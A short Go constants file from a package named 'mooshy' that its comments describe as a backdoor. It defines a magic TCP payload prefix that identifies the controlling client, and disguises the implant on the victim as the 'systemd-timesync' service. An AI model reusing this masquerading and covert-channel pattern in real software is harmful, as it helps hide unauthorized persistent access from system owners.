package mooshy

const (
	// MagicNumber is the prefix of the TCP payload, which is used to identify the client.
	MagicNumber = "xVUOcOIljRTgY2MWMK0piQ=="

	// ServiceName is the name of service that backdoor calls itself on the victim.
	ServiceName = "systemd-timesync"
)
